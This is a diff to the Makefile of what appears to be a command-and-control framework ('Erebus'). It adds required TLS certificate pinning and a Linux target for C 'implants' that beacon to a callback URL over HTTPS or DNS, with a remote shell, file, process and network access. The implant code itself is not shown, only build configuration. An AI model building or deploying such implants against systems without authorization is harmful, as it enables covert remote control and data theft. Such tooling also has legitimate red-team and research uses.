@@ -27,9 +27,14 @@ ifneq ($(shell printf '%s' '$(IMPLANT_SECRET)' | wc -c),64)
 $(error IMPLANT_SECRET must be 64 hex chars (32 bytes), got $(shell printf '%s' '$(IMPLANT_SECRET)' | wc -c))
 endif
 
-# CA cert for TLS pinning (optional, set CA_CERT_PATH to embed)
+# CA cert for TLS pinning (required for HTTPS implants — no InsecureSkipVerify).
+# Example: make implant CA_CERT_PATH=$$HOME/.erebus/ca-cert.pem
+# Go implant: CA_CERT_PEM is base64 of the PEM file bytes.
+# C implant: needs base64 DER — use CA_CERT_PATH (converted below) or C_CA_CERT_PEM.
 CA_CERT_PATH   ?=
-CA_CERT_PEM    ?= $(if $(CA_CERT_PATH),$(shell base64 -w0 $(CA_CERT_PATH)),)
+CA_CERT_PEM    ?= $(if $(CA_CERT_PATH),$(shell base64 -w0 $(CA_CERT_PATH) 2>/dev/null || base64 $(CA_CERT_PATH)),)
+# C-only pin: PEM file → DER → base64 (matches builder_c.go / FireFlow eng).
+C_CA_CERT_PEM  ?= $(if $(CA_CERT_PATH),$(shell openssl x509 -in "$(CA_CERT_PATH)" -outform DER 2>/dev/null | base64 -w0 2>/dev/null || openssl x509 -in "$(CA_CERT_PATH)" -outform DER 2>/dev/null | base64),)
 
 # Transport config (override for DNS)
 TRANSPORT_TYPE ?= https
@@ -111,13 +116,30 @@ else
   C_TOOLCHAIN_BIN := $(MINGW_BIN)
 endif
 implant-c:
-	PATH="$(C_TOOLCHAIN_BIN):$$PATH" $(MAKE) -C cimplant all \
+	PATH="$(C_TOOLCHAIN_BIN):$$PATH" $(MAKE) -C cimplant all OS=windows \
 		IMPLANT_ID="$(IMPLANT_ID)" \
 		IMPLANT_SECRET="$(IMPLANT_SECRET)" \
 		CALLBACK_URL="$(CALLBACK_URL)" \
 		SLEEP_MS="$(SLEEP_MS)" \
 		JITTER_PCT="$(JITTER_PCT)" \
-		CA_CERT_PEM="$(CA_CERT_PEM)" \
+		CA_CERT_PATH="$(CA_CERT_PATH)" \
+		CA_CERT_PEM="$(C_CA_CERT_PEM)" \
+		TRANSPORT_TYPE="$(TRANSPORT_TYPE)" \
+		DNS_DOMAIN="$(DNS_DOMAIN)" \
+		DNS_SERVER="$(DNS_SERVER)" \
+		CDN_DOMAIN="$(CDN_DOMAIN)"
+
+# Basic Linux C peer (shell/files/process/net + HTTPS beacon). Needs gcc, libcurl, openssl.
+# CA: pass CA_CERT_PATH=$$HOME/.erebus/ca-cert.pem (auto PEM→DER→b64 for C).
+implant-c-linux:
+	$(MAKE) -C cimplant all OS=linux \
+		IMPLANT_ID="$(IMPLANT_ID)" \
+		IMPLANT_SECRET="$(IMPLANT_SECRET)" \
+		CALLBACK_URL="$(CALLBACK_URL)" \
+		SLEEP_MS="$(SLEEP_MS)" \
+		JITTER_PCT="$(JITTER_PCT)" \
+		CA_CERT_PATH="$(CA_CERT_PATH)" \
+		CA_CERT_PEM="$(C_CA_CERT_PEM)" \
 		TRANSPORT_TYPE="$(TRANSPORT_TYPE)" \
 		DNS_DOMAIN="$(DNS_DOMAIN)" \
 		DNS_SERVER="$(DNS_SERVER)" \
